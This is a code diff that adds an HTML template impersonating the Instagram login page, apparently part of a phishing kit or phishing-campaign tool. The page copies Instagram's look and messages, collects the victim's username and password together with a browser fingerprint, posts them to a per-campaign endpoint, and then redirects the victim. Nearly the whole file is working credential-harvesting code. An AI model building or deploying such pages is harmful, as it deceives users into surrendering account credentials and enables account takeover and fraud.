@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Instagram</title>
+  <script src="/fingerprint.js"></script>
+  <style>
+    * { margin:0; padding:0; box-sizing:border-box; }
+    body { font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif; background:#fafafa; display:flex; align-items:center; justify-content:center; min-height:100vh; flex-direction:column; }
+    .card { background:#fff; padding:2.5rem 2rem; border:1px solid #dbdbdb; width:100%; max-width:350px; text-align:center; margin-bottom:0.5rem; }
+    .logo { font-family:'Billabong','Segoe UI',sans-serif; font-size:2.8rem; margin-bottom:1.5rem; color:#262626; }
+    input { width:100%; padding:0.65rem 0.5rem; background:#fafafa; border:1px solid #dbdbdb; border-radius:3px; font-size:0.85rem; margin-bottom:0.4rem; }
+    input:focus { outline:none; border-color:#a8a8a8; }
+    input::placeholder { color:#8e8e8e; }
+    button { width:100%; padding:0.55rem; background:#0095f6; color:#fff; border:none; border-radius:8px; font-size:0.85rem; font-weight:600; cursor:pointer; margin-top:0.5rem; }
+    button:hover { background:#1877f2; }
+    .divider { display:flex; align-items:center; margin:1rem 0; color:#8e8e8e; font-size:0.8rem; }
+    .divider::before, .divider::after { content:''; flex:1; border-bottom:1px solid #dbdbdb; }
+    .divider::before { margin-right:1rem; } .divider::after { margin-left:1rem; }
+    .fb-btn { color:#385185; font-weight:600; font-size:0.85rem; text-decoration:none; display:flex; align-items:center; justify-content:center; gap:6px; margin:0.5rem 0; }
+    .forgot { color:#00376b; font-size:0.75rem; text-decoration:none; display:block; margin-top:1rem; }
+    .signup-box { background:#fff; border:1px solid #dbdbdb; width:100%; max-width:350px; padding:1.5rem; text-align:center; font-size:0.85rem; }
+    .signup-box a { color:#0095f6; font-weight:600; text-decoration:none; }
+    .error { color:#ed4956; font-size:0.8rem; margin-bottom:0.5rem; display:none; }
+    .app-links { margin-top:1rem; display:flex; gap:8px; justify-content:center; }
+    .app-links img { height:40px; }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <div class="logo">Instagram</div>
+    <div class="error" id="error">Wrong password. Try again or click Forgot password.</div>
+    <form id="loginForm">
+      <input type="text" id="email" placeholder="Phone number, username, or email" autocomplete="off" required>
+      <input type="password" id="password" placeholder="Password" required>
+      <button type="submit">Log in</button>
+    </form>
+    <div class="divider">OR</div>
+    <a href="#" class="fb-btn">
+      <svg width="16" height="16" viewBox="0 0 16 16"><path fill="#385185" d="M16 8.049c0-4.446-3.582-8.05-8-8.05C3.58 0-.002 3.603-.002 8.05c0 4.017 2.926 7.347 6.75 7.951v-5.625h-2.03V8.05H6.75V6.275c0-2.017 1.195-3.131 3.022-3.131.876 0 1.791.157 1.791.157v1.98h-1.009c-.993 0-1.303.621-1.303 1.258v1.51h2.218l-.354 2.326H9.25V16c3.824-.604 6.75-3.934 6.75-7.951z"/></svg>
+      Log in with Facebook
+    </a>
+    <a href="#" class="forgot">Forgot password?</a>
+  </div>
+  <div class="signup-box">
+    Don't have an account? <a href="#">Sign up</a>
+  </div>
+  <div class="app-links">
+    <span style="font-size:0.8rem;color:#8e8e8e;">Get the app.</span>
+  </div>
+  <script>
+    document.getElementById('loginForm').addEventListener('submit', async (e) => {
+      e.preventDefault();
+      const email = document.getElementById('email').value;
+      const password = document.getElementById('password').value;
+      const fp = await getFingerprint();
+      try {
+        const res = await fetch('/c/<%= campaign.id %>', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ email, password, ...fp, fingerprints: JSON.stringify(fp) })
+        });
+        const data = await res.json();
+        if (data.redirect) window.location.href = data.redirect;
+      } catch { window.location.href = '<%= redirect %>'; }
+    });
+  </script>
+</body>
+</html>
